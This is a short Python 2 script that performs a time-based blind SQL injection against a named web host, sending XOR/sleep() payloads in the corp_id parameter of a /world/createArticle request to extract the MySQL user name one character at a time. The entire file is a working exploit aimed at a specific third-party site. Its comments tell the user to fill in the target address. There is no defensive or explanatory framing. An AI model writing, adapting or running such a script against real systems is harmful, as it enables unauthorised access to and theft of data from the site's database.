#encoding=utf-8

import httplib

import time

import string

import sys

import random

import urllib



headers = {}

payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.ABCDEFGHIJKLMNOPQRST'



print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())

user = ''

for i in range(1, 21):#21是user判断出的长度+1

    for payload in payloads:

        try:

            s = "ascii(mid(lower(user()),%s,1))=%s" % (i, ord(payload))

            s = "aaa'XOR(if(%s,sleep(3),0))OR'bbb" % s

            conn = httplib.HTTPConnection('kact.kingdee.com', timeout=3)#输入网站地址

            conn.request(method='GET',url="/world/createArticle?corp_id=%s" % urllib.quote(s))

            conn.getresponse()

            conn.close()

            print '.',

        except:

            user += payload

            print '\n[in progress]', user,

            time.sleep(3.0)

            break

        

print '\n[Done] MySQL user is %s' % user
